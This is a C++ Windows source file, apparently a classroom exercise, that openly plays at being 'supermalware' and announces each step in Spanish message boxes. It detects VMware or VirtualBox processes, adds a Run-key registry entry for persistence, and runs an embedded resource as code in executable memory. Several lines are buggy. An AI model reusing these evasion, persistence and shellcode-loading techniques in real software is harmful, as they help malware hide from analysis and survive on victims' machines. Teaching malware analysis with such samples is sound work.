// Activitat3.cpp : Defines the entry point for the application.
//

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{

    MessageBoxA(NULL, (LPCSTR)"Soy un supermalware, esconde tus datos!", "¡Hola clase!", MB_OK | MB_ICONWARNING);

    pregunta1();

    pregunta2();

    pregunta3();

    return 0;
}

    
void pregunta1()
{
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE)
    {
        exit(0);
    }

    PROCESSENTRY32 pe32M;
    pe32M.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnapshot, &pe32M))
    {
        exit(0);
    }

    do
    {
        if (lstrcmpW(pe32M.szExeFile, TEXT("vmtoolsd.exe")) == 0 || lstrcmpW(pe32M.szExeFile, TEXT("VBoxService.exe")) == 0)
        {
            MessageBoxA(NULL, (LPCSTR)"hahah! Maquina virtual detectada!", "¡Hola clase!", MB_OK | MB_ICONWARNING);
            break;
        }
    } while (Process32Next(hProcessSnapshot, &pe32M));

    CloseHandle(hProcessSnapshot);

    return;
}


void pregunta2()
{

    MessageBoxA(NULL, (LPCSTR)"Donde me escondere? Quiero sobrevivir el reinicio!", "¡Hola clase!", MB_OK | MB_ICONWARNING);


    HKEY key = 0;

    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &key,
        NULL);

    const char* data = "C:\\Windows\\System32\\calc.exe";

    RegSetValueExA(key, "Supermalware", 0, REG_BINARY, (LPBYTE)data, sizeof(data));
    RegCloseKey(key);

    return;
}


void pregunta3()
{

    MessageBoxA(NULL, (LPCSTR)"En los recursos encontraras un tesoro", "¡Hola clase!", MB_OK | MB_ICONWARNING);



    HRSRC hRes = FindResource(NULL, TEXT("tesoro"), RT_RCDATA);
    if (hRes == NULL)
    {
        exit(0);
    }

    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (hResLoad == NULL)
    {
        exit(0);
    }

    DWORD payloadSize = SizeofResource(NULL, hRes);

    void* exec = VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
    {
        exit(0);
    }

    memcpy(exec, hRes, payloadSize);

    ((void(*)())exec)();

    return;
}

